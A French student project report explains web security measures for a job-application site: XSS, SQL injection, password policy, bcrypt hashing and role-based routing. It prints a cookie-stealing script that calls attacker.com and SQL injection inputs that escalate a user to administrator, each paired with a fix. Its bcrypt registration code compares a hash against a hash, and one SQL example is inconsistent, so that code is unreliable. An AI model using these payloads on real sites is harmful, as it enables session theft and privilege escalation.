# Cross-Site Scripting

Pour une attaque XSS, nous avons la fonctionnalité d'envoyer des candidatures accompagnées par un message que l'utilisateur peut écrire lui même. Lorsqu'un utilisateur soumet un message, nous le stockons dans la base de données, puis on l'affichez sur la page des recruteurs en insérant directement le message dans le HTML de la page.

C'est là que se trouve la faille. Si un utilisateur malveillant soumet un message de candidature comme celui-ci :

```html
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie;</script>
```

Le script sera exécuté chaque fois qu'un utilisateur charge la candidature. Le script redirige l'utilisateur vers un site contrôlé par l'attaquant et y envoie le cookie de l'utilisateur en tant que paramètre d'URL. Si vous utilisez des cookies pour les sessions d'utilisateurs, l'attaquant peut ainsi voler la session de l'utilisateur et usurper son identité.

Pour éviter cela, on doit correctement échappé le texte avant de l'afficher sur votre site. Cela signifie que les caractères spéciaux tels que `<` et `>` doivent être remplacés par leurs équivalents HTML, soit `&lt;` et `&gt;`. Cela empêche le navigateur d'interpréter le contenu comme du code HTML ou JavaScript.

Dans notre cas, nous utilisons la bibliothèque `escape-html`, voici un exemple d'utilisation :

```javascript
const escapeHtml = require('escape-html');

let candidature = getCandidature("alix@utc.fr"); // On récupere une candidature
let safeComment = escapeHtml(candidature.comment); // On échappe le texte

response.send(`<p>${safeComment}</p>`);
```

Dans cet exemple, si un utilisateur soumet le commentaire de script malveillant mentionné ci-dessus, il sera affiché sur la page en tant que texte brut, et non exécuté en tant que script.

# Injection SQL

Dans une situation où l'application prend un email comme entrée pour rechercher un utilisateur dans la base de données, nous avons :

```sql
SELECT * FROM Utilisateurs WHERE email = '[email]'
```

Une injection SQL possible pourrait ressembler à ce qui suit, avec `alix@utc.fr' --` comme entrée :

```sql
SELECT * FROM Utilisateurs WHERE email = 'alix@utc.fr' --'
```

Ici, le `--` est un commentaire en SQL qui fait ignorer tout ce qui suit. Ainsi, cette requête récupère tous les détails de l'utilisateur avec l'email "alix", en ignorant la vérification du mot de passe ou d'autres contraintes qui peuvent être présentes dans la requête originale.

Pour modifier les rôles, un attaquant pourrait injecter une requête telle que :

```sql
alix@utc.fr'; UPDATE Utilisateurs SET role = 'Administrateur' WHERE email = 'alix@utc.fr
```

Ce qui aboutirait à la requête suivante :

```sql
SELECT * FROM Utilisateurs WHERE email = 'alix'; UPDATE Utilisateurs SET role = 'Administrateur' WHERE email = 'alix'
```

Cela changerait le rôle de l'utilisateur "alix" en "Administrateur".

Pour prévenir les injections SQL, il faut utiliser des requêtes paramétrées (aussi appelées requêtes préparées). Voici un exemple avec MySQL en Node.js :

``````js
read: function (email, callback) {
    db.query("SELECT * FROM Utilisateurs WHERE email= ?", [email], function
        (err, results) {
        if (err) throw err;
        callback(results);
    });
}

``````

# Authentification et Gestion des Rôles

Nous avons mis l'accent sur l'importance de la sécurité, en particulier en ce qui concerne l'authentification des utilisateurs et la gestion des rôles. Le système mis en place pour assurer la sécurité comprend plusieurs niveaux de protection.

## Mots de passe respectant les recommandations du CNIL

Tout d'abord afin d'assurer un premier niveau de sécurité, nous avons forcé l'utilisateur à rentrer un mot de passe qui respecte les recommandations du CNIL pour éviter les attaques brutes forces basiques.

```js

function isValidPassword(password) {
            // Au moins 12 caractères
            if (password.length < 12) return false;
    
            // Doit contenir une majuscule
            if (!/[A-Z]/.test(password)) return false;
    
            // Doit contenir une minuscule
            if (!/[a-z]/.test(password)) return false;
    
            // Doit contenir un chiffre
            if (!/[0-9]/.test(password)) return false;
    
            // Doit contenir un caractère spécial
            if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) return false;
    
            return true;
        }

```
## Hashage et Salage des Mots de Passe

De plus, pour éviter les attaques par force brute plus poussée, j'ai implémenté un système de hashage avec ajout de sel aux mots de passe des utilisateurs grâce à bcrypt. Le hashage transforme le mot de passe original en une chaîne de caractères aléatoires. Le "sel" est une donnée aléatoire qui est générée et ajoutée au mot de passe avant le hashage. Cela garantit que même si deux utilisateurs ont le même mot de passe, leurs hash seront différents. En outre, ce processus rend les attaques par tables arc-en-ciel pratiquement impossibles, car chaque mot de passe est unique en raison du sel.

```js
bcrypt.genSalt(10, function (err, salt) {
        if (err) throw err;

        // Hash the password
        bcrypt.hash(data.mdp, salt, function (err, hashedPassword) {
            if (err) throw err;

            // Create the user with the hashed password
            result = userModel.create(data.email, data.nom, data.prenom, hashedPassword, data.tel, data.role, function (result) {
                user = userModel.read(data.email, function (data_user) {
                    const user = data_user[0];

                    bcrypt.compare(hashedPassword, user.mdp, function (err, result) {
                        if (err) throw err;

                        res.render('connexion', { title: 'Page Connexion Utilisateur', result: result })

                    });
                });
            });
        });
    });
```

## Gestion des Rôles et Autorisations de Routage

Le site est organisé de telle sorte que chaque rôle a accès à des sections spécifiques du site. Par exemple, un utilisateur avec le rôle d'administrateur aura accès à des parties du site qui ne sont pas accessibles à un utilisateur normal. Pour réaliser cela, j'ai implémenté un système de routage qui définit les autorisations d'accès en fonction du rôle de l'utilisateur. Ce cloisonnement du site aide à protéger les informations sensibles et à prévenir les accès non autorisés.

```js
app.all("*", function (req, res, next) {
  const roles = ["Administrateur", "Candidat", "Recruteur"]
  const nonSecurePaths = ["/", "/js/*", "/img/job-promotion.png", "/favicon.ico", "/stylesheets/*", "/users/checkUser", "/users/nvUser", "/users/connexion", "/users/register", "/users/", "/users/logout/", "/users/logout"];
  const adminPaths = ["/admin", "/organization_management", "/user_management", "/organization_management/update", "/organization_management/delete", "/users/userslist", "/users/update", "/users/delete"]; //list des urls admin
  const candidatPaths = ["/home", "/organization_form", "/candidature", "/candidature/postuler", "/organization_form/request", "/offers_details", "/candidature/delete"]; //list des urls candidats
  const recruteurPaths = ["/recruiter", "/offers_management", "/application_management", "/offers_form", "/offers_form/request"]; //list des urls recruter
  const commonPaths = ["/profil", "/profil/update", "/request_role/recruteur", "/request_role/admin"]


  if (nonSecurePaths.includes(req.path)) return next();

  if (!(req.session && req.session.user && req.session.user.role && roles.includes(req.session.user.role))) { return res.redirect("/users/connexion") };
  //authenticate user
  if (commonPaths.includes(req.path)) {
    return next()
  }
  if (adminPaths.includes(req.path)) {
    if (isConnected(req.session, "Administrateur")) return next();
    else res.status(403).render("error", { message: " Unauthorized access", error: {} });
  }
  else if (candidatPaths.includes(req.path)) {
    if (isConnected(req.session, "Candidat")) return next();
    else res.status(403).render("error", { message: " Unauthorized access", error: {} });
  }
  else if (recruteurPaths.includes(req.path)) {
    if (isConnected(req.session, "Recruteur")) return next();
    else res.status(403).render("error", { message: " Unauthorized access", error: {} });
  } else {
    res.redirect("/users/connexion");
  }
});
```

## Utilisation des Sessions pour l'Authentification

J'ai utilisé les sessions pour faciliter l'authentification des utilisateurs. Lorsqu'un utilisateur se connecte, une session est créée qui contient des informations sur l'utilisateur. Cela permet de maintenir l'état de l'utilisateur tout au long de sa visite sur le site. Les sessions sont particulièrement utiles pour suivre l'état de l'authentification de l'utilisateur et permettent une vérification d'identité fluide et sécurisée tout au long de l'interaction de l'utilisateur avec le site.

Dans l'ensemble, le système de sécurité mis en place pour ce projet vise à garantir la sécurité et l'intégrité des données des utilisateurs, tout en permettant une gestion efficace des rôles et des autorisations d'accès.

```js
bcrypt.compare(providedPassword, hashedPassword, function (err, passwordMatch) {
            if (err) throw err;

            if (passwordMatch) {
                req.session.user = {
                    email: user.email,
                    role: user.role
                };


                if(user.role=='Administrateur'){
                    return res.redirect('/admin');
                }
                else if(user.role=='Candidat')
                {
                    return res.redirect('/home');
                }
                else if(user.role=='Recruteur')
                {
                    return res.redirect('/recruiter');
                }   
                else {
                    return res.redirect('/users/logout');
                }
                
            } else {
                return res.redirect('/users/connexion');
            }
        });
```

